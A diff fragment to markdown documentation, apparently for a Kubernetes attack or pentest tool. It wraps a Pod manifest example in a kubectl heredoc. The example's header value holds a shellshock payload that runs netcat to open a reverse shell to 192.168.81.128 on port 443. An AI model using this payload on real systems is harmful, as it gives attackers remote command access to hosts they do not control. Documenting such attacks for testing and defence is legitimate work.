@@ -177,6 +177,7 @@ EOF
 ```
 ### Examples4 : Attacking http(s) endpoints using shellshock
 ```
+kubectl apply -f - <<EOF
 apiVersion: v1
 kind: Pod
 metadata:
@@ -201,6 +202,7 @@ spec:
           value: () { :;};echo;/bin/nc -e /bin/bash 192.168.81.128 443
       initialDelaySeconds: 3
       periodSeconds: 3
+ EOF
  ```
 
 ### Conclusion
